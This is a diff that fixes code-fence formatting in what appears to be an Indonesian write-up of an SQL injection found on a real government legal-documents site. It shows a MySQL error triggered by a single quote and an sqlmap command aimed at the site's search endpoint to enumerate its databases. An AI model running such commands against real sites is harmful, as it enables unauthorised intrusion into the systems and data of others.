@@ -14,10 +14,10 @@ Ketika saya mencoba untuk mencari point inject nya, saya berpikir untuk mencari 
 
 ![ ](https://miro.medium.com/max/2400/1*hr9EiGPmSCHbaXuqYVpOLg.png)
 
-'''
+```
 Respons
 “ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘%’ OR title like ‘%’%’ ) AND `state` IS NOT NULL ORDER BY `created` desc’ at line 3 “
-'''
+```
 
 Sesudah Saya mendapatkan pesan error setelah memasukkan single quote (‘), lanjut Saya mencari post datanya menggunakan Live Http Header di Mozilla Firefox atau ke inspect element lalu ke bagian network. Berikut Post Data yang sudah Saya dapatkan
 
@@ -29,9 +29,9 @@ ___
 
 Selanjutnya saya Melakukan Scan di SQL Map Dengan Command
 
-'''
+```
 sqlmap.py -u “http://jdih.dephub.go.id/pencarian” — data=”s=’&jenis_peraturan=0&nomor=&tahun=0” — dbs
-'''
+```
 
 Hasil dari scannya adalah
 
